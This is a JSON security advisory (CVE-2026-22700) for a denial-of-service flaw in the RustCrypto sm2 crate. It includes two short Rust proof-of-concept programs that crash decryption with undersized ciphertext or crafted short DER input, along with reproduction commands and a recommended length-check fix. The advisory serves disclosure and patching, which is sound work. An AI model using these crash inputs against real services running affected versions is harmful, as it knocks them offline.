@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-j9xq-69pf-pcm8",
+  "modified": "2026-01-13T15:11:40.195051Z",
+  "published": "2026-01-13T15:02:23Z",
+  "aliases": [
+    "CVE-2026-22700"
+  ],
+  "summary": "RustCrypto Has Insufficient Length Validation in decrypt() in SM2-PKE",
+  "details": "### Summary\n\nA denial-of-service vulnerability exists in the SM2 public-key encryption (PKE) implementation: the `decrypt()` path performs unchecked `slice::split_at` operations on input buffers derived from untrusted ciphertext. An attacker can submit short/undersized ciphertext or carefully-crafted DER-encoded structures to trigger bounds-check panics (Rust unwinding) which crash the calling thread or process.\n\n\n### Affected Component / Versions\n\n- File: `src/pke/decrypting.rs`\n\n- Functions: `DecryptingKey::decrypt_digest/decrypt/decrypt_der`, internal `decrypt()` implementation\n\n- Affected releases: \n  \n  - sm2 0.14.0-rc.0 (https://crates.io/crates/sm2/0.14.0-rc.0)\n  - sm2 0.14.0-pre.0 (https://crates.io/crates/sm2/0.14.0-pre.0)\n  \n  \n\n\n### Details\n\nThe vulnerability is located in the file `sm2/src/pke/decrypting.rs`. The **fundamental cause** of the vulnerability is that the decryption function **does not strictly check** the ciphertext's format and length information. Consequently, a maliciously crafted ciphertext can trigger Rust's **panic mechanism** instead of the expected error handling (`Error`) mechanism. The Rust function `C.split_at(L)` will trigger a Panic if the length is less than `L`, as shown in the code comment below: the `decrypting` function has **at least three locations** where a slice operation might trigger a Panic.\n\n```rust\nfn decrypt(\n    secret_scalar: \u0026Scalar,\n    mode: Mode,\n    hasher: \u0026mut dyn DynDigest,\n    cipher: \u0026[u8],\n) -\u003e Result\u003cVec\u003cu8\u003e\u003e {\n    let q = U256::from_be_hex(FieldElement::MODULUS);\n    let c1_len = q.bits().div_ceil(8) * 2 + 1;  // Typically 65 for SM2\n\n    // B1: get 𝐶1 from 𝐶\n    let (c1, c) = cipher.split_at(c1_len as usize);  // PANIC HERE if cipher.len() \u003c 65\n    let encoded_c1 = EncodedPoint::from_bytes(c1).map_err(Error::from)?;\n\n    // ... (lines 170-178 omitted)\n\n    let digest_size = hasher.output_size();  // Typically 32 for SM3\n    let (c2, c3) = match mode {\n        Mode::C1C3C2 =\u003e {\n            let (c3, c2) = c.split_at(digest_size);  // PANIC HERE if c.len() \u003c 32\n            (c2, c3)\n        }\n        Mode::C1C2C3 =\u003e c.split_at(c.len() - digest_size),  // PANIC HERE if c.len() \u003c 32\n    };\n\n```\n\nRust's `slice::split_at` panics when the split index is greater than the slice length. A panic in library code typically unwinds the thread and can crash an application if not explicitly caught. This means an attacker that can submit ciphertexts to a service using this library may cause a DoS.\n\n\n\n\n### Proof of Concept (PoC)\n\nTwo PoCs were added to this repository under `examples/` demonstrating the two\ncommon ways to trigger the issue:\n\n- `examples/poc_short_ciphertext.rs` — constructs a deliberately undersized\n  ciphertext (e.g., `vec![0u8; 10]`) and passes it to `DecryptingKey::decrypt`.\n  This triggers the `cipher.split_at(c1_len)` panic.\n\n  ``` rust\n  //! PoC: trigger panic in SM2 decryption by supplying a ciphertext that is shorter\n  //! than the expected C1 length so that `cipher.split_at(c1_len)` panics.\n  //!\n  //! Usage:\n  //!   cargo run --example poc_short_ciphertext\n  \n  use rand_core::OsRng;\n  \n  use sm2::pke::DecryptingKey;\n  use sm2::SecretKey;\n  \n  fn main() {\n      // Generate a normal secret key and DecryptingKey instance.\n      let mut rng = OsRng;\n      let sk = SecretKey::try_from_rng(\u0026mut rng).expect(\"failed to generate secret key\");\n      let dk = DecryptingKey::new(sk);\n  \n      // to trigger the vulnerability in `decrypt()` where it does `cipher.split_at(c1_len)`.\n      let short_ciphertext = vec![0u8; 10]; // deliberately too short\n  \n      println!(\"Calling decrypt with undersized ciphertext (len = {})...\", short_ciphertext.len());\n  \n      // The panic is the PoC for the lack of length validation.\n      let _ = dk.decrypt(\u0026short_ciphertext);\n  \n      // If the library were robust, this line would be reached and decrypt would return Err.\n      println!(\"decrypt returned (unexpected) - PoC did not panic\");\n  }\n  ```\n  \n  \n  \n- `examples/poc_der_short.rs` — constructs an ASN.1 `Cipher` structure with\n  valid-length `x`/`y` coordinates (from a generated public key) but with tiny\n  `digest` and `cipher` OCTET STRING fields (1 byte each). When run with the\n  crate built with `--features std`, `Cipher::from_der` accepts the DER and the\n  call flows into `decrypt()`, which then panics on the later `split_at`.\n  \n  ``` rust\n  //! Usage:\n  //!   RUST_BACKTRACE=1 cargo run --example poc_der_short --features std\n  \n  use rand_core::OsRng;\n  use sm2::SecretKey;\n  use sm2::pke::DecryptingKey;\n  \n  fn build_der(x: \u0026[u8], y: \u0026[u8], digest: \u0026[u8], cipher: \u0026[u8]) -\u003e Vec\u003cu8\u003e {\n      // Build SEQUENCE { INTEGER x, INTEGER y, OCTET STRING digest, OCTET STRING cipher }\n      let mut body = Vec::new();\n  \n      // INTEGER x\n      body.push(0x02);\n      body.push(x.len() as u8);\n      body.extend_from_slice(x);\n  \n      // INTEGER y\n      body.push(0x02);\n      body.push(y.len() as u8);\n      body.extend_from_slice(y);\n  \n      // OCTET STRING digest (intentionally tiny)\n      body.push(0x04);\n      body.push(digest.len() as u8);\n      body.extend_from_slice(digest);\n  \n      // OCTET STRING cipher (intentionally tiny)\n      body.push(0x04);\n      body.push(cipher.len() as u8);\n      body.extend_from_slice(cipher);\n  \n      // SEQUENCE header\n      let mut der = Vec::new();\n      der.push(0x30);\n      der.push(body.len() as u8);\n      der.extend(body);\n      der\n  }\n  \n  fn main() {\n      let mut rng = OsRng;\n      let sk = SecretKey::try_from_rng(\u0026mut rng).expect(\"failed to generate secret key\");\n      // Extract recipient public key coordinates before moving the secret key into DecryptingKey\n      let pk = sk.public_key();\n      let dk = DecryptingKey::new(sk);\n      // get SEC1 encoding 0x04 || X || Y and slice out X and Y\n      let sec1 = pk.to_sec1_bytes();\n      let sec1_ref: \u0026[u8] = sec1.as_ref();\n      let x = \u0026sec1_ref[1..33];\n      let y = \u0026sec1_ref[33..65];\n      // Very small digest and cipher to trigger length-based panics inside decrypt()\n      let digest = [0x33u8; 1];\n      let cipher = [0x44u8; 1];\n  \n      let der = build_der(x, y, \u0026digest, \u0026cipher);\n  \n      println!(\"Calling decrypt_der with crafted short DER (len={})...\", der.len());\n  \n      // Expected to panic inside decrypt() due to missing length checks when splitting\n      let _ = dk.decrypt_der(\u0026der);\n  \n      println!(\"decrypt_der returned (unexpected) - PoC did not panic\");\n  }\n  ```\n  \n  \n\nReproduction (from repository root):\n\n```bash\n# PoC that directly uses decrypt on a short buffer\ncargo run --example poc_short_ciphertext --features std\n\n# PoC that passes a short DER to decrypt_der\nRUST_BACKTRACE=1 cargo run --example poc_der_short --features std\n```\n\n\n\n\n### Impact\n\n- Direct Denial of Service: remote untrusted input can crash the thread/process handling decryption.\n- Low attacker effort: crafting short inputs or small DER octet strings is trivial.\n- Wide exposure: any application that exposes decryption endpoints and links this library is at risk.\n\n\n### Recommended Fix\n\nPerform defensive length checks before any `split_at` usage and return a controlled `Err` instead of allowing a panic. Minimal fixes in `decrypt()`:\n\n```rust\nlet c1_len_usize = c1_len as usize;\nif cipher.len() \u003c c1_len_usize {\n    return Err(Error);\n}\nlet (c1, c) = cipher.split_at(c1_len_usize);\n\nlet digest_size = hasher.output_size();\nif c.len() \u003c digest_size {\n    return Err(Error);\n}\nlet (c2, c3) = match mode {\n    Mode::C1C3C2 =\u003e {\n        let (c3, c2) = c.split_at(digest_size);\n        (c2, c3)\n    }\n    Mode::C1C2C3 =\u003e c.split_at(c.len() - digest_size),\n};\n```\n\nAfter applying these checks, `decrypt()` will return an error for short or malformed inputs instead of panicking.\n\n\n\n### **Credit**\n\nThis vulnerability was discovered by:\n\n- XlabAI Team of Tencent Xuanwu Lab\n\n- Atuin Automated Vulnerability Discovery Engine\n\nCVE and credit are preferred.\n\nIf you have any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is xlabai@tencent.com.\n\n \n\n### **Note**\n\nWe follow the security industry standard disclosure policy—the 90+30 policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, we reserve the right to publicly disclose all information about the issues after this timeframe.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "sm2",
+        "purl": "pkg:cargo/sm2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.14.0-pre.0"
+            },
+            {
+              "last_affected": "0.14.0-rc.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-j9xq-69pf-pcm8/GHSA-j9xq-69pf-pcm8.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-j9xq-69pf-pcm8"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-22700"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/RustCrypto/elliptic-curves/pull/1603"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/RustCrypto/elliptic-curves/commit/e60e99167a9a2b187ebe80c994c5204b0fdaf4ab"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/RustCrypto/elliptic-curves"
+    }
+  ]
+}
